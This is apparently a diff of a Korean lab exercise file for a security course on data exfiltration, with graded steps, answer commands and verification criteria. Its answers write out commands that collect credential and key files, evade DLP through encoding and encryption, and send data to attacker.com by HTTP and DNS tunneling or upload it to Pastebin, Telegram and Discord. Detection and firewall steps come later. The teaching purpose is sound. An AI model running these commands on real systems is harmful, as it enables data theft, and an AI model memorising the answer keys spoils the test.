@@ -3,8 +3,8 @@ title: 데이터 유출 (Data Exfiltration)
 version: non-ai
 course: attack-nonai
 week: 11
-description: 침해된 시스템에서 민감한 데이터를 외부로 유출하는 다양한 기법을 실습한다. HTTP, DNS, ICMP 터널링, 스테가노그래피 등 탐지를 회피하는 유출 기법과
-  방어 방법을 학습한다.
+description: 침해된 시스템에서 민감한 데이터를 외부로 유출하는 다양한 기법을 실습한다. HTTP, DNS, ICMP 터널링, 스테가노그래피
+  등 탐지를 회피하는 유출 기법과 방어 방법을 학습한다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -14,22 +14,25 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과 데이터 파일을 검색하라.
+  instruction: web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과 데이터
+    파일을 검색하라.
   hint: find 명령으로 .conf, .env, .key, .pem 등의 파일을 검색한다
   category: recon
   points: 10
-  answer: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf" -o -name "*.env" -o
-    -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null | head -20' 2>/dev/null
-  answer_detail: 데이터 유출의 첫 단계는 가치 있는 데이터를 식별하는 것이다. 설정 파일(자격 증명), 키 파일(인증서), 데이터 덤프(SQL) 등이 주요 대상이다. MITRE
-    ATT&CK의 Collection 전술에 해당한다.
+  answer: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf"
+    -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null
+    | head -20' 2>/dev/null
+  answer_detail: 데이터 유출의 첫 단계는 가치 있는 데이터를 식별하는 것이다. 설정 파일(자격 증명), 키 파일(인증서), 데이터 덤프(SQL)
+    등이 주요 대상이다. MITRE ATT&CK의 Collection 전술에 해당한다.
   verify:
     type: output_contains
     expect: /
     field: stdout
     semantic:
-      intent: 민감 파일 식별 — ssh ccc@10.20.30.80 'find /etc /home /var/www -type f ( -name *.conf -o -name
-        *.env -o -name *.key -o -name *.pem -o -name *.sql )'. MITRE T1005 Data from Local System + T1083.
-        Collection 전술 첫 단계 — 가치 있는 데이터(credentials/key/SQL dump) 식별.
+      intent: 민감 파일 식별 — ssh ccc@10.20.30.80 'find /etc /home /var/www -type f ( -name
+        *.conf -o -name *.env -o -name *.key -o -name *.pem -o -name *.sql )'. MITRE
+        T1005 Data from Local System + T1083. Collection 전술 첫 단계 — 가치 있는 데이터(credentials/key/SQL
+        dump) 식별.
       success_criteria:
       - find + 확장자 필터 (.conf/.env/.key/.pem/.sql)
       - 민감 디렉터리 3곳 (/etc/home/var/www)
@@ -50,18 +53,22 @@ steps:
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; users=json.load(sys.stdin)[''data''];
-    [print(f\"{u[''id'']},{u[''email'']}\") for u in users]" > /tmp/exfil_users.csv && echo ''Extracted
-    users:'' && wc -l /tmp/exfil_users.csv && head -5 /tmp/exfil_users.csv'
-  answer_detail: 데이터 추출 후 CSV나 JSON 형식으로 저장하면 후속 처리가 용이하다. 실전에서는 대량 데이터를 청크로 나누어 점진적으로 유출하여 탐지를 회피한다.
+    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
+    users=json.load(sys.stdin)[''data'']; [print(f\"{u[''id'']},{u[''email'']}\")
+    for u in users]" > /tmp/exfil_users.csv && echo ''Extracted users:'' && wc -l
+    /tmp/exfil_users.csv && head -5 /tmp/exfil_users.csv'
+  answer_detail: 데이터 추출 후 CSV나 JSON 형식으로 저장하면 후속 처리가 용이하다. 실전에서는 대량 데이터를 청크로 나누어 점진적으로
+    유출하여 탐지를 회피한다.
   verify:
     type: output_contains
-    expect: Extracted users
+    expect:
+    - Extracted users
+    - csv
     field: stdout
     semantic:
-      intent: JuiceShop API 사용자 데이터 추출 — curl http://10.20.30.80:3000/api/Users | python3 파싱 > /tmp/exfil_users.csv.
-        MITRE T1005 + T1213 Data from Information Repositories. OWASP API2:2023 Broken Authentication
-        — 인증 없이 사용자 DB 노출.
+      intent: JuiceShop API 사용자 데이터 추출 — curl http://10.20.30.80:3000/api/Users |
+        python3 파싱 > /tmp/exfil_users.csv. MITRE T1005 + T1213 Data from Information
+        Repositories. OWASP API2:2023 Broken Authentication — 인증 없이 사용자 DB 노출.
       success_criteria:
       - curl /api/Users + JSON 파싱
       - CSV 저장 + Extracted users 키워드
@@ -80,17 +87,19 @@ steps:
   hint: base64 명령으로 파일을 인코딩한다
   category: exploit
   points: 10
-  answer: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo 'Original size:' && wc -c /tmp/exfil_users.csv
-    && echo 'Encoded size:' && wc -c /tmp/exfil_encoded.txt && echo 'Preview:' && head -3 /tmp/exfil_encoded.txt
-  answer_detail: Base64 인코딩은 바이너리 데이터를 텍스트로 변환하여 텍스트 기반 채널(HTTP, DNS)을 통해 전송할 수 있게 한다. 크기가 약 33% 증가하지만,
-    DLP 시스템의 패턴 매칭을 회피할 수 있다.
+  answer: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo 'Original size:'
+    && wc -c /tmp/exfil_users.csv && echo 'Encoded size:' && wc -c /tmp/exfil_encoded.txt
+    && echo 'Preview:' && head -3 /tmp/exfil_encoded.txt
+  answer_detail: Base64 인코딩은 바이너리 데이터를 텍스트로 변환하여 텍스트 기반 채널(HTTP, DNS)을 통해 전송할 수 있게
+    한다. 크기가 약 33% 증가하지만, DLP 시스템의 패턴 매칭을 회피할 수 있다.
   verify:
     type: output_contains
     expect: Original size
     field: stdout
     semantic:
-      intent: Base64 인코딩 — base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && wc -c 원본/인코딩 비교. MITRE
-        T1132.001 Standard Encoding. 바이너리→텍스트 변환으로 HTTP/DNS 텍스트 채널 전송 가능. 약 33% 크기 증가 but DLP 패턴 매칭 회피.
+      intent: Base64 인코딩 — base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt &&
+        wc -c 원본/인코딩 비교. MITRE T1132.001 Standard Encoding. 바이너리→텍스트 변환으로 HTTP/DNS
+        텍스트 채널 전송 가능. 약 33% 크기 증가 but DLP 패턴 매칭 회피.
       success_criteria:
       - base64 명령 실행
       - Original size + Encoded size 비교
@@ -109,20 +118,22 @@ steps:
   hint: curl -X POST -d @파일 형태로 데이터를 전송한다
   category: exploit
   points: 10
-  answer: 'echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl -X POST -d @/tmp/exfil_encoded.txt
-    http://attacker.com/collect'' && echo ''---'' && echo ''With headers disguise:'' && echo ''curl -X
-    POST -H "Content-Type: application/json" -d "{\"log\":\"$(head -1 /tmp/exfil_encoded.txt)\"}" http://attacker.com/api/logs''
-    && echo ''---'' && echo ''HTTP exfil detected by: proxy logs, DLP, unusual POST sizes'''
-  answer_detail: HTTP를 통한 데이터 유출은 정상 웹 트래픽과 구분하기 어렵다. JSON API 요청으로 위장하거나 정상적인 클라우드 서비스(pastebin, cloud
-    storage)를 경유하면 탐지가 더 어려워진다.
+  answer: 'echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl -X
+    POST -d @/tmp/exfil_encoded.txt http://attacker.com/collect'' && echo ''---''
+    && echo ''With headers disguise:'' && echo ''curl -X POST -H "Content-Type: application/json"
+    -d "{\"log\":\"$(head -1 /tmp/exfil_encoded.txt)\"}" http://attacker.com/api/logs''
+    && echo ''---'' && echo ''HTTP exfil detected by: proxy logs, DLP, unusual POST
+    sizes'''
+  answer_detail: HTTP를 통한 데이터 유출은 정상 웹 트래픽과 구분하기 어렵다. JSON API 요청으로 위장하거나 정상적인 클라우드
+    서비스(pastebin, cloud storage)를 경유하면 탐지가 더 어려워진다.
   verify:
     type: output_contains
     expect: HTTP Exfiltration
     field: stdout
     semantic:
-      intent: HTTP POST 유출 시뮬 — curl -X POST -d @/tmp/exfil_encoded.txt http://attacker/collect + JSON
-        위장 헤더. MITRE T1048.003 Exfiltration Over Unencrypted Protocol + T1041 Exfiltration Over C2 Channel.
-        정상 웹 트래픽과 구분 어려움.
+      intent: HTTP POST 유출 시뮬 — curl -X POST -d @/tmp/exfil_encoded.txt http://attacker/collect
+        + JSON 위장 헤더. MITRE T1048.003 Exfiltration Over Unencrypted Protocol + T1041
+        Exfiltration Over C2 Channel. 정상 웹 트래픽과 구분 어려움.
       success_criteria:
       - HTTP Exfiltration 키워드
       - curl -X POST -d @파일 형태
@@ -141,19 +152,21 @@ steps:
   hint: 데이터를 hex/base32로 인코딩하여 DNS 쿼리에 포함한다
   category: exploit
   points: 10
-  answer: 'DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''=== DNS Tunneling Simulation
-    ==='' && echo "Original: $DATA" && echo "Encoded: $ENCODED" && echo "DNS query: dig $ENCODED.exfil.attacker.com"
-    && echo ''---'' && echo ''Real tools: iodine, dnscat2, DNSExfiltrator'' && echo ''Detection: unusually
-    long DNS queries, high query volume to single domain'''
-  answer_detail: 'DNS 터널링은 데이터를 DNS 쿼리의 서브도메인으로 인코딩하여 전송한다. DNS는 거의 모든 네트워크에서 허용되므로 방화벽 우회에 효과적이다. 탐지:
-    비정상적으로 긴 도메인명, 단일 도메인에 대한 과다 쿼리.'
+  answer: 'DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''===
+    DNS Tunneling Simulation ==='' && echo "Original: $DATA" && echo "Encoded: $ENCODED"
+    && echo "DNS query: dig $ENCODED.exfil.attacker.com" && echo ''---'' && echo ''Real
+    tools: iodine, dnscat2, DNSExfiltrator'' && echo ''Detection: unusually long DNS
+    queries, high query volume to single domain'''
+  answer_detail: 'DNS 터널링은 데이터를 DNS 쿼리의 서브도메인으로 인코딩하여 전송한다. DNS는 거의 모든 네트워크에서 허용되므로
+    방화벽 우회에 효과적이다. 탐지: 비정상적으로 긴 도메인명, 단일 도메인에 대한 과다 쿼리.'
   verify:
     type: output_contains
     expect: DNS Tunneling
     field: stdout
     semantic:
-      intent: 'DNS 터널링 — xxd -p로 hex 인코딩 후 서브도메인에 삽입, dig encoded.exfil.attacker.com. MITRE T1048.003
-        + T1071.004 DNS. iodine/dnscat2/DNSExfiltrator 도구. 탐지: 긴 도메인명 + 단일 도메인 과다 쿼리.'
+      intent: 'DNS 터널링 — xxd -p로 hex 인코딩 후 서브도메인에 삽입, dig encoded.exfil.attacker.com.
+        MITRE T1048.003 + T1071.004 DNS. iodine/dnscat2/DNSExfiltrator 도구. 탐지: 긴 도메인명
+        + 단일 도메인 과다 쿼리.'
       success_criteria:
       - DNS Tunneling 키워드
       - xxd/base32 인코딩 + 서브도메인
@@ -172,20 +185,23 @@ steps:
   hint: ping -p 옵션으로 패턴 데이터를 지정할 수 있다
   category: exploit
   points: 10
-  answer: 'echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data in ICMP payload:'' &&
-    DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex: $DATA_HEX" && ping -c 1 -p $DATA_HEX 10.20.30.80
-    2>&1 | head -5 && echo ''---'' && echo ''Tools: icmpsh, ptunnel, icmptunnel'' && echo ''Detection:
-    unusual ICMP packet sizes, high ICMP volume'''
-  answer_detail: 'ICMP 터널링은 ping 패킷의 데이터 영역에 정보를 삽입하여 전송한다. 방화벽이 TCP/UDP를 차단해도 ICMP는 허용하는 경우가 많다. 탐지:
-    비정상적인 ICMP 패킷 크기와 빈도를 모니터링한다.'
+  answer: 'echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data in
+    ICMP payload:'' && DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex: $DATA_HEX"
+    && ping -c 1 -p $DATA_HEX 10.20.30.80 2>&1 | head -5 && echo ''---'' && echo ''Tools:
+    icmpsh, ptunnel, icmptunnel'' && echo ''Detection: unusual ICMP packet sizes,
+    high ICMP volume'''
+  answer_detail: 'ICMP 터널링은 ping 패킷의 데이터 영역에 정보를 삽입하여 전송한다. 방화벽이 TCP/UDP를 차단해도 ICMP는
+    허용하는 경우가 많다. 탐지: 비정상적인 ICMP 패킷 크기와 빈도를 모니터링한다.'
   verify:
     type: output_contains
-    expect: ICMP Tunneling
+    expect:
+    - ICMP Tunneling
+    - ping
     field: stdout
     semantic:
-      intent: 'ICMP 터널링 — ping -p <hex> -c 1 10.20.30.80. MITRE T1048.003 + T1095 Non-Application Layer
-        Protocol. ICMP 페이로드 영역 데이터 삽입. 방화벽이 ICMP 허용 시 우회 효과. 도구: icmpsh/ptunnel/icmptunnel. 탐지: 비정상 ICMP
-        크기/빈도.'
+      intent: 'ICMP 터널링 — ping -p <hex> -c 1 10.20.30.80. MITRE T1048.003 + T1095
+        Non-Application Layer Protocol. ICMP 페이로드 영역 데이터 삽입. 방화벽이 ICMP 허용 시 우회 효과.
+        도구: icmpsh/ptunnel/icmptunnel. 탐지: 비정상 ICMP 크기/빈도.'
       success_criteria:
       - ICMP Tunneling 키워드
       - ping -p 패턴 사용
@@ -204,20 +220,21 @@ steps:
   hint: openssl enc -aes-256-cbc 옵션으로 파일을 암호화한다
   category: exploit
   points: 10
-  answer: 'openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin -pass
-    pass:exfil_key_2026 -pbkdf2 2>/dev/null && echo ''Encrypted file:'' && file /tmp/exfil_encrypted.bin
-    && ls -la /tmp/exfil_encrypted.bin && echo ''---'' && echo ''Decryption: openssl enc -d -aes-256-cbc
-    -in exfil_encrypted.bin -pass pass:key -pbkdf2'''
-  answer_detail: 암호화된 데이터는 DLP 시스템의 콘텐츠 검사를 완전히 회피한다. 개인정보, 신용카드 번호 등의 패턴 매칭이 불가능해지므로, 네트워크 행위 기반 탐지(비정상
-    전송 패턴)에 의존해야 한다.
+  answer: 'openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin
+    -pass pass:exfil_key_2026 -pbkdf2 2>/dev/null && echo ''Encrypted file:'' && file
+    /tmp/exfil_encrypted.bin && ls -la /tmp/exfil_encrypted.bin && echo ''---'' &&
+    echo ''Decryption: openssl enc -d -aes-256-cbc -in exfil_encrypted.bin -pass pass:key
+    -pbkdf2'''
+  answer_detail: 암호화된 데이터는 DLP 시스템의 콘텐츠 검사를 완전히 회피한다. 개인정보, 신용카드 번호 등의 패턴 매칭이 불가능해지므로,
+    네트워크 행위 기반 탐지(비정상 전송 패턴)에 의존해야 한다.
   verify:
     type: output_contains
     expect: Encrypted file
     field: stdout
     semantic:
-      intent: AES-256 암호화 유출 — openssl enc -aes-256-cbc -salt -in csv -out bin -pass pass:key -pbkdf2.
-        MITRE T1022 Data Encrypted (legacy) + T1560.001 Archive via Utility. DLP 콘텐츠 검사 완전 회피 → 네트워크 행위
-        기반 탐지만 가능.
+      intent: AES-256 암호화 유출 — openssl enc -aes-256-cbc -salt -in csv -out bin -pass
+        pass:key -pbkdf2. MITRE T1022 Data Encrypted (legacy) + T1560.001 Archive
+        via Utility. DLP 콘텐츠 검사 완전 회피 → 네트워크 행위 기반 탐지만 가능.
       success_criteria:
       - openssl enc -aes-256-cbc + -pbkdf2
       - Encrypted file 키워드 + file 명령 검증
@@ -236,18 +253,20 @@ steps:
   hint: split 명령으로 파일을 분할하고 순차 전송을 시뮬레이션한다
   category: exploit
   points: 10
-  answer: split -b 50 /tmp/exfil_users.csv /tmp/chunk_ && echo 'Chunks created:' && ls -la /tmp/chunk_*
-    && echo '---' && echo 'Low-and-slow exfil simulation:' && for f in /tmp/chunk_*; do echo "Sending
-    $(basename $f) ($(wc -c < $f) bytes) at $(date +%H:%M:%S)"; done
-  answer_detail: Low-and-Slow 유출은 데이터를 작은 조각으로 나누어 긴 시간에 걸쳐 전송한다. 각 전송이 정상 트래픽과 구분되지 않을 정도로 소량이므로 볼륨 기반
-    탐지를 회피한다.
+  answer: split -b 50 /tmp/exfil_users.csv /tmp/chunk_ && echo 'Chunks created:' &&
+    ls -la /tmp/chunk_* && echo '---' && echo 'Low-and-slow exfil simulation:' &&
+    for f in /tmp/chunk_*; do echo "Sending $(basename $f) ($(wc -c < $f) bytes) at
+    $(date +%H:%M:%S)"; done
+  answer_detail: Low-and-Slow 유출은 데이터를 작은 조각으로 나누어 긴 시간에 걸쳐 전송한다. 각 전송이 정상 트래픽과 구분되지
+    않을 정도로 소량이므로 볼륨 기반 탐지를 회피한다.
   verify:
     type: output_contains
     expect: Chunks created
     field: stdout
     semantic:
-      intent: Low-and-Slow 청크 분할 — split -b 50 csv chunk_ + 시간차 전송 시뮬. MITRE T1030 Data Transfer Size
-        Limits + T1029 Scheduled Transfer. 작은 조각 + 긴 시간 = 볼륨 기반 탐지 회피.
+      intent: Low-and-Slow 청크 분할 — split -b 50 csv chunk_ + 시간차 전송 시뮬. MITRE T1030
+        Data Transfer Size Limits + T1029 Scheduled Transfer. 작은 조각 + 긴 시간 = 볼륨 기반
+        탐지 회피.
       success_criteria:
       - split -b 청크 분할
       - Chunks created + 다중 청크 파일
@@ -266,21 +285,23 @@ steps:
   hint: steghide 또는 단순히 cat으로 파일을 결합한다
   category: exploit
   points: 10
-  answer: 'echo ''SECRET_DATA:admin@juice-sh.op:password123'' > /tmp/secret.txt && dd if=/dev/urandom
-    bs=1024 count=10 of=/tmp/fake_image.jpg 2>/dev/null && cat /tmp/fake_image.jpg /tmp/secret.txt > /tmp/stego_image.jpg
-    && echo ''Steganography simulation:'' && echo ''Original: '' $(wc -c < /tmp/fake_image.jpg) ''bytes''
-    && echo ''With hidden data: '' $(wc -c < /tmp/stego_image.jpg) ''bytes'' && echo ''Extract: tail -c
-    $(wc -c < /tmp/secret.txt) /tmp/stego_image.jpg'' && echo ''---'' && echo ''Real tools: steghide,
-    openstego, snow'''
-  answer_detail: 스테가노그래피는 데이터를 다른 파일(이미지, 오디오, 비디오) 안에 숨기는 기법이다. 파일의 외형은 정상적이므로 콘텐츠 검사로 탐지하기 매우 어렵다. 전문
-    분석 도구(binwalk, stegdetect)가 필요하다.
+  answer: 'echo ''SECRET_DATA:admin@juice-sh.op:password123'' > /tmp/secret.txt &&
+    dd if=/dev/urandom bs=1024 count=10 of=/tmp/fake_image.jpg 2>/dev/null && cat
+    /tmp/fake_image.jpg /tmp/secret.txt > /tmp/stego_image.jpg && echo ''Steganography
+    simulation:'' && echo ''Original: '' $(wc -c < /tmp/fake_image.jpg) ''bytes''
+    && echo ''With hidden data: '' $(wc -c < /tmp/stego_image.jpg) ''bytes'' && echo
+    ''Extract: tail -c $(wc -c < /tmp/secret.txt) /tmp/stego_image.jpg'' && echo ''---''
+    && echo ''Real tools: steghide, openstego, snow'''
+  answer_detail: 스테가노그래피는 데이터를 다른 파일(이미지, 오디오, 비디오) 안에 숨기는 기법이다. 파일의 외형은 정상적이므로 콘텐츠
+    검사로 탐지하기 매우 어렵다. 전문 분석 도구(binwalk, stegdetect)가 필요하다.
   verify:
     type: output_contains
     expect: Steganography simulation
     field: stdout
     semantic:
-      intent: '스테가노그래피 — cat fake.jpg secret.txt > stego.jpg + tail -c로 추출. MITRE T1027.003 Steganography.
-        이미지/오디오 안에 데이터 은닉 → 콘텐츠 검사 회피. 도구: steghide/openstego/snow. 분석 도구: binwalk/stegdetect.'
+      intent: '스테가노그래피 — cat fake.jpg secret.txt > stego.jpg + tail -c로 추출. MITRE
+        T1027.003 Steganography. 이미지/오디오 안에 데이터 은닉 → 콘텐츠 검사 회피. 도구: steghide/openstego/snow.
+        분석 도구: binwalk/stegdetect.'
       success_criteria:
       - Steganography simulation 키워드
       - 이미지+secret 결합 + 크기 비교
@@ -295,24 +316,27 @@ steps:
       - 크기 비교 없음
   target_vm: attacker
 - order: 10
-  instruction: curl을 사용하여 클라우드 서비스를 통한 유출을 시뮬레이션하라. pastebin 형태의 서비스로 데이터를 전송하는 명령을 작성하라.
+  instruction: curl을 사용하여 클라우드 서비스를 통한 유출을 시뮬레이션하라. pastebin 형태의 서비스로 데이터를 전송하는 명령을
+    작성하라.
   hint: curl로 REST API에 데이터를 POST한다
   category: exploit
   points: 10
-  answer: 'echo ''=== Cloud Service Exfiltration ==='' && echo ''Pastebin: curl -X POST -d "api_paste_code=$(cat
-    /tmp/exfil_encoded.txt)" https://pastebin.com/api/api_post.php'' && echo ''Telegram: curl -F "document=@/tmp/exfil_encrypted.bin"
-    https://api.telegram.org/bot<TOKEN>/sendDocument?chat_id=<ID>'' && echo ''Discord: curl -F "file=@/tmp/data.zip"
-    https://discord.com/api/webhooks/<ID>'' && echo ''---'' && echo ''Detection: SSL inspection, domain
-    reputation, upload volume monitoring'''
-  answer_detail: 클라우드 서비스(Pastebin, Google Drive, Telegram, Discord)를 경유한 유출은 HTTPS 암호화로 콘텐츠 검사가 어렵다.
-    DLP 솔루션의 SSL 인터셉션과 도메인 카테고리 기반 차단이 필요하다.
+  answer: 'echo ''=== Cloud Service Exfiltration ==='' && echo ''Pastebin: curl -X
+    POST -d "api_paste_code=$(cat /tmp/exfil_encoded.txt)" https://pastebin.com/api/api_post.php''
+    && echo ''Telegram: curl -F "document=@/tmp/exfil_encrypted.bin" https://api.telegram.org/bot<TOKEN>/sendDocument?chat_id=<ID>''
+    && echo ''Discord: curl -F "file=@/tmp/data.zip" https://discord.com/api/webhooks/<ID>''
+    && echo ''---'' && echo ''Detection: SSL inspection, domain reputation, upload
+    volume monitoring'''
+  answer_detail: 클라우드 서비스(Pastebin, Google Drive, Telegram, Discord)를 경유한 유출은 HTTPS
+    암호화로 콘텐츠 검사가 어렵다. DLP 솔루션의 SSL 인터셉션과 도메인 카테고리 기반 차단이 필요하다.
   verify:
     type: output_contains
     expect: Cloud Service Exfiltration
     field: stdout
     semantic:
-      intent: 클라우드 서비스 유출 — pastebin/Telegram bot/Discord webhook으로 curl POST/-F. MITRE T1567.002 Exfiltration
-        to Cloud Storage + T1567.001 Code Repository. HTTPS 암호화 + 정상 도메인 = 콘텐츠/도메인 평판 검사 회피.
+      intent: 클라우드 서비스 유출 — pastebin/Telegram bot/Discord webhook으로 curl POST/-F.
+        MITRE T1567.002 Exfiltration to Cloud Storage + T1567.001 Code Repository.
+        HTTPS 암호화 + 정상 도메인 = 콘텐츠/도메인 평판 검사 회피.
       success_criteria:
       - Cloud Service Exfiltration 키워드
       - pastebin/Telegram/Discord 등 2개 이상
@@ -331,18 +355,20 @@ steps:
   hint: tar czf 명령으로 압축 아카이브를 생성한다
   category: exploit
   points: 10
-  answer: tar czf /tmp/exfil_archive.tar.gz /tmp/exfil_users.csv /tmp/exfil_encoded.txt 2>/dev/null &&
-    echo 'Archive created:' && ls -lh /tmp/exfil_archive.tar.gz && echo 'Original total:' && du -ch /tmp/exfil_users.csv
-    /tmp/exfil_encoded.txt 2>/dev/null | tail -1 && echo 'Compression ratio achieved'
-  answer_detail: 데이터 압축은 전송 시간과 볼륨을 줄여 탐지 위험을 낮춘다. 텍스트 데이터는 90% 이상 압축될 수 있다. 암호화와 결합하면(tar czf - | openssl
-    enc) 콘텐츠 검사와 볼륨 분석을 모두 회피할 수 있다.
+  answer: tar czf /tmp/exfil_archive.tar.gz /tmp/exfil_users.csv /tmp/exfil_encoded.txt
+    2>/dev/null && echo 'Archive created:' && ls -lh /tmp/exfil_archive.tar.gz &&
+    echo 'Original total:' && du -ch /tmp/exfil_users.csv /tmp/exfil_encoded.txt 2>/dev/null
+    | tail -1 && echo 'Compression ratio achieved'
+  answer_detail: 데이터 압축은 전송 시간과 볼륨을 줄여 탐지 위험을 낮춘다. 텍스트 데이터는 90% 이상 압축될 수 있다. 암호화와
+    결합하면(tar czf - | openssl enc) 콘텐츠 검사와 볼륨 분석을 모두 회피할 수 있다.
   verify:
     type: output_contains
     expect: Archive created
     field: stdout
     semantic:
-      intent: tar+gzip 압축 — tar czf /tmp/exfil_archive.tar.gz csv encoded.txt. MITRE T1560.001 Archive
-        via Utility. 텍스트 90%+ 압축 → 전송 시간/볼륨 감소. 암호화 결합 (tar czf - | openssl) = 콘텐츠+볼륨 양면 회피.
+      intent: tar+gzip 압축 — tar czf /tmp/exfil_archive.tar.gz csv encoded.txt. MITRE
+        T1560.001 Archive via Utility. 텍스트 90%+ 압축 → 전송 시간/볼륨 감소. 암호화 결합 (tar czf
+        - | openssl) = 콘텐츠+볼륨 양면 회피.
       success_criteria:
       - tar czf 명령
       - Archive created 키워드 + ls -lh
@@ -361,20 +387,22 @@ steps:
   hint: tcpdump으로 DNS(port 53) 트래픽을 캡처하고 패킷 크기를 분석한다
   category: analysis
   points: 10
-  answer: echo '=== Exfiltration Detection ===' && echo 'DNS tunneling detection:' && echo 'tcpdump -i
-    any port 53 -nn -l | awk "{if(length>200) print \"SUSPICIOUS:\", \$0}"' && echo '---' && echo 'HTTP
-    exfil detection:' && echo 'tcpdump -i any port 80 or port 443 -nn -c 10 -q' && echo '---' && echo
-    'ICMP exfil detection:' && echo 'tcpdump -i any icmp -nn -l | awk "{if(length>100) print \"LARGE ICMP:\",
+  answer: echo '=== Exfiltration Detection ===' && echo 'DNS tunneling detection:'
+    && echo 'tcpdump -i any port 53 -nn -l | awk "{if(length>200) print \"SUSPICIOUS:\",
+    \$0}"' && echo '---' && echo 'HTTP exfil detection:' && echo 'tcpdump -i any port
+    80 or port 443 -nn -c 10 -q' && echo '---' && echo 'ICMP exfil detection:' &&
+    echo 'tcpdump -i any icmp -nn -l | awk "{if(length>100) print \"LARGE ICMP:\",
     \$0}"' && echo '---' && sudo tcpdump -c 3 -i any port 53 -nn 2>&1 | head -5
-  answer_detail: 네트워크 기반 유출 탐지는 비정상적인 트래픽 패턴을 식별한다. DNS 쿼리 길이, ICMP 패킷 크기, HTTP POST 볼륨 등이 주요 지표이다. IDS/IPS
-    규칙과 SIEM 상관 분석을 결합하면 효과적이다.
+  answer_detail: 네트워크 기반 유출 탐지는 비정상적인 트래픽 패턴을 식별한다. DNS 쿼리 길이, ICMP 패킷 크기, HTTP POST
+    볼륨 등이 주요 지표이다. IDS/IPS 규칙과 SIEM 상관 분석을 결합하면 효과적이다.
   verify:
     type: output_contains
     expect: Exfiltration Detection
     field: stdout
     semantic:
-      intent: '유출 탐지 tcpdump — DNS: port 53 + length>200 / HTTP: port 80|443 / ICMP: icmp + length>100.
-        NIST SP 800-94 IDS 가이드. 비정상 쿼리 길이/볼륨 = IoC. Suricata/Zeek 룰 + SIEM 상관 분석.'
+      intent: '유출 탐지 tcpdump — DNS: port 53 + length>200 / HTTP: port 80|443 / ICMP:
+        icmp + length>100. NIST SP 800-94 IDS 가이드. 비정상 쿼리 길이/볼륨 = IoC. Suricata/Zeek
+        룰 + SIEM 상관 분석.'
       success_criteria:
       - Exfiltration Detection 키워드
       - DNS/HTTP/ICMP 3채널 탐지
@@ -393,18 +421,19 @@ steps:
   hint: xxd -p로 hex 인코딩, xxd -r -p로 디코딩한다
   category: exploit
   points: 10
-  answer: echo 'admin:password123' | xxd -p > /tmp/hex_exfil.txt && echo 'Hex encoded:' && cat /tmp/hex_exfil.txt
-    && echo 'Decoded:' && xxd -r -p /tmp/hex_exfil.txt && echo '---' && echo 'Hex encoding is useful for
-    embedding data in URLs, cookies, and headers'
-  answer_detail: Hex 인코딩은 Base64와 함께 데이터 변환에 자주 사용된다. URL, HTTP 헤더, 쿠키 등 다양한 채널에 데이터를 삽입할 수 있다. 여러 인코딩을
-    중첩하면 패턴 매칭을 더 어렵게 만든다.
+  answer: echo 'admin:password123' | xxd -p > /tmp/hex_exfil.txt && echo 'Hex encoded:'
+    && cat /tmp/hex_exfil.txt && echo 'Decoded:' && xxd -r -p /tmp/hex_exfil.txt &&
+    echo '---' && echo 'Hex encoding is useful for embedding data in URLs, cookies,
+    and headers'
+  answer_detail: Hex 인코딩은 Base64와 함께 데이터 변환에 자주 사용된다. URL, HTTP 헤더, 쿠키 등 다양한 채널에 데이터를
+    삽입할 수 있다. 여러 인코딩을 중첩하면 패턴 매칭을 더 어렵게 만든다.
   verify:
     type: output_contains
     expect: Hex encoded
     field: stdout
     semantic:
-      intent: Hex 인코딩 — xxd -p 원본 > hex + xxd -r -p 복원. MITRE T1132.001 Standard Encoding. URL/쿠키/헤더 등
-        다양한 채널 삽입 가능. Base64와 중첩 인코딩 시 패턴 매칭 난이도 상승.
+      intent: Hex 인코딩 — xxd -p 원본 > hex + xxd -r -p 복원. MITRE T1132.001 Standard Encoding.
+        URL/쿠키/헤더 등 다양한 채널 삽입 가능. Base64와 중첩 인코딩 시 패턴 매칭 난이도 상승.
       success_criteria:
       - xxd -p 인코딩 + xxd -r -p 디코딩
       - Hex encoded 키워드
@@ -423,21 +452,24 @@ steps:
   hint: nftables의 ct bytes 매처를 사용하여 연결당 전송량을 제한한다
   category: analysis
   points: 15
-  answer: 'echo -e ''=== DLP Firewall Rules (nftables) ===\n\n# Rate limit outbound connections\nadd rule
-    inet filter output tcp dport {80, 443} ct state new limit rate 10/minute burst 20 accept\nadd rule
-    inet filter output tcp dport {80, 443} ct state new drop\n\n# Block DNS to non-approved servers\nadd
-    rule inet filter output udp dport 53 ip daddr != 10.20.30.1 drop\n\n# Log large outbound transfers\nadd
-    rule inet filter output ct bytes > 10485760 log prefix "LARGE_TRANSFER: " accept\n\n# Block ICMP with
-    large payload\nadd rule inet filter output icmp type echo-request meta length > 100 drop'''
